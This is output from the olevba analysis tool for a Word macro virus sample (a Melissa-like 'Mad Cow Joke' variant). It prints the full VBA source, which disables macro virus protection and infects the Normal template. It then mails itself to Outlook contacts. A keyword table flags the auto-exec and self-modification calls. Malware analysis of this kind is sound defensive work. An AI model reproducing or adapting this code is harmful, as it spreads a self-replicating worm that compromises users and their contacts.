olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.cn-4cc9eaf4efd52862ab7e2c8feb8cb1cc21a22185
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.cn-4cc9eaf4efd52862ab7e2c8feb8cb1cc21a22185 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
On Error Resume Next
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
Options.VirusProtection = 0 - 0
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
Options.SaveNormalPrompt = 0 - 0
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
Options.ConfirmConversions = 0 - 0
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
VSize = 136
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
If nt < VSize - 1 Then
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Set Vhost = NormalTemplate.VBProject.VBComponents.Item(1)
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Set VSource = ActiveDocument.VBProject.VBComponents.Item(1)
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    nt = 77
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    GoTo out
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
End If
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
If ad = 0 Then
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Set Vhost = ActiveDocument.VBProject.VBComponents.Item(1)
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Set VSource = NormalTemplate.VBProject.VBComponents.Item(1)
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    GoTo out
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
End If
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
GoTo VMailer
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
out:
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
With Vhost.CodeModule
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    VSource.Export "c:\v.sys"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    .AddFromFile ("c:\v.sys")
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    For x = 2 To VSize Step 2
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
        .ReplaceLine x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Next x
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
End With
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
For x = 1 To 4
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
     Vhost.CodeModule.deletelines 1
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
Next x
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
Vhost.CodeModule.ReplaceLine 1, "Sub AutoOpen"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
Vhost.CodeModule.ReplaceLine 131, "Sub ViewVBCode"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
If nt = 77 Then
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Sub AutoClose"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 131, "Sub ToolsMacro"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
End If
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
VMailer:
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
If ActiveDocument.Name <> "Madcow" Then
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Dim VOutlook, VMapi, VMail
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Set VOutlook = CreateObject("Outlook.Application")
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    Set VMapi = VOutlook.GetNameSpace("MAPI")
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    If VOutlook = "Outlook" Then
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    VMapi.Logon "profile", "password"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
        For y = 1 To VMapi.AddressLists.Count
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
            Set AddyBook = VMapi.AddressLists(y)
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
            x = 1
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
            Set VMail = VOutlook.CreateItem(0)
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
            For oo = 1 To AddyBook.AddressEntries.Count
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
                Peep = AddyBook.AddressEntries(x)
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
                VMail.Recipients.Add Peep
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
                x = x + 1
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
                If x > 20 Then oo = AddyBook.AddressEntries.Count
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
             Next oo
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
             VMail.Subject = "Mad Cow Joke"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
             VMail.Body = "Beware of the spread of the Madcow Disease"
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
             VMail.Attachments.Add ActiveDocument.FullName
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
             VMail.Send
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
             Peep = ""
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
        Next y
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    VMapi.Logoff
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
    End If
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
End If
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
VError:
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
End Sub
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
Sub ViewVBCode()
'Compaq3/31/99 4:28:16 PMHP LaserJet IIISi on \\ELROND\AV3W97MadcoOffice Logo
End Sub

'WORD/VERONICA // thanks to WORD/MELLISA & WORD/CLASS

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

